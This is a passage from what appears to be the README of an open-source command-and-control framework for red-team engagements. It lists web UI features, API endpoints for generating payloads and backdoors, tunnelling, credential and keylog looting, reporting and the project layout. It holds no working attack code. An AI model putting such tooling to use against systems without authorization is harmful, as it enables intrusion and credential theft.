- **Files** — OS-adaptive file browser with clickable folders, screenshot/process viewer
- **Credentials** — add/view/remove harvested creds with type tagging
- **Loot** — browse captured output by type (creds, files, screenshots, keylogs)
- **Pivot Map** — canvas network graph showing agents by subnet
- **IOC Dashboard** — tracks files, connections, processes, persistence artifacts
- **Session Replay** — replay any agent's command history with timestamps
- **Templates** — 6 built-in command templates + MITRE ATT&CK mapping + auto-tasks
- **Audit** — operator audit log (who sent what to which agent)
- **Events** — event log + engagement notes
- **Theme** — light/dark mode toggle with persistence

### Web UI API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/login` | GET/POST | Login page and authentication |
| `/logout` | GET | End session |
| `/api/agents` | GET | List all agents |
| `/api/agent/{name}` | GET | Agent detail with task history |
| `/api/agent/remove` | POST | Delete a dead agent |
| `/api/agent/rename` | POST | Rename an agent |
| `/api/listeners` | GET | List all listeners |
| `/api/listener/create` | POST | Create and start a listener |
| `/api/listener/start` | GET | Start a stopped listener |
| `/api/listener/stop` | GET | Stop a running listener |
| `/api/presets` | GET/POST | Manage listener presets |
| `/api/tasks` | GET | All tasks across agents |
| `/api/events` | GET | Event log |
| `/api/cmd` | POST | Send command to an agent |
| `/api/payload/generate` | POST | Generate any payload type |
| `/api/payload/download` | GET | Download generated payload |
| `/api/payload/types` | GET | List available payload types |
| `/api/payload/apps` | GET | List mobile app templates |
| `/api/payload/backdoor` | POST | Generate persistence backdoor |
| `/api/payload/backdoor/binary` | POST | Backdoor an executable |
| `/api/payload/backdoor/types` | GET | List backdoor types |
| `/api/tunnel/start` | POST | Start SOCKS5 tunnel through agent |
| `/api/tunnel/stop` | GET | Stop SOCKS5 tunnel |
| `/api/tunnel/list` | GET | List active tunnels |
| `/api/loot` | GET | Browse all captured loot |
| `/api/templates` | GET/POST | Command templates CRUD |
| `/api/autotasks` | GET/POST | Auto-task configuration |
| `/api/auditlog` | GET | Operator audit log |
| `/api/notes?agent=` | GET/POST | Read/add agent notes |
| `/api/search?q=` | GET | Search all task output |
| `/api/operators` | GET | List online operators |
| `/api/filebrowser` | GET | Request directory listing from agent |
| `/api/screenshot` | GET | Request screenshot from agent |
| `/api/processlist` | GET | Request process list from agent |

### Multi-Operator Support

Multiple pentesters can use the same server simultaneously:
- Each operator logs in with their own credentials
- Agent notes show which operator added them
- `/api/operators` shows who's currently online
- CLI and Web UI can be used at the same time

## Engagement Reporting

```
phantom > report md       # Markdown report with full activity timeline
phantom > report csv      # CSV export of all commands and output
phantom > report all      # Both formats
```

Reports saved to `reports/` with timestamps. Includes: executive summary, per-agent timelines, command output, infrastructure details.

## Webhook Notifications

```
phantom > webhook slack https://hooks.slack.com/services/T.../B.../xxx
phantom > webhook discord https://discord.com/api/webhooks/xxx/yyy
phantom > webhook test
```

Auto-notifies on: new agent registration, agent death, listener events.

## Project Structure

```
phantom/
  cmd/
    server/          Server entrypoint
    agent/           Agent entrypoint
    keygen/          RSA keypair generator
    e2etest/         End-to-end test runner
  internal/
    server/          Core server, config, webhooks
    listener/        HTTP/HTTPS/DNS listeners + malleable profiles + SMB pipes
    agent/           Agent manager + builder
    task/            Task dispatcher + queues
    crypto/          RSA-2048, AES-256-GCM, key exchange
    protocol/        Wire protocol + msgpack serialization
    db/              SQLite database + repositories
    cli/             CLI shell (readline), tables, reporting
    webui/           Web dashboard (embedded HTML/JS)
    implant/         Agent: shell, file, screenshot, persist, AD, BOF, evasion,
                     token, keylogger, SOCKS, creds, pivot, staging
    payloads/        Payload generator (web shells, stagers, macros)
    util/            Shared utilities
  configs/           Server config + malleable profiles
  scripts/           Helper scripts
  docs/              Documentation + screenshots
  Dockerfile         Multi-stage Docker build
  docker-compose.yml One-line deployment
```

---

## Disclaimer

**This tool is designed for authorized red team engagements and security research only.**

Unauthorized access to computer systems is illegal. You are responsible for ensuring you have proper authorization before using this tool. The author accepts no liability for misuse.

Always:
- Obtain written authorization before testing
- Follow your organization's rules of engagement
- Document all activities
- Report findings responsibly

## Author

**Opeyemi Kolawole** - [GitHub](https://github.com/Phantom-C2-77) | ckkolawole77@gmail.com

## License

BSD 3-Clause License - see [LICENSE](LICENSE) for details.
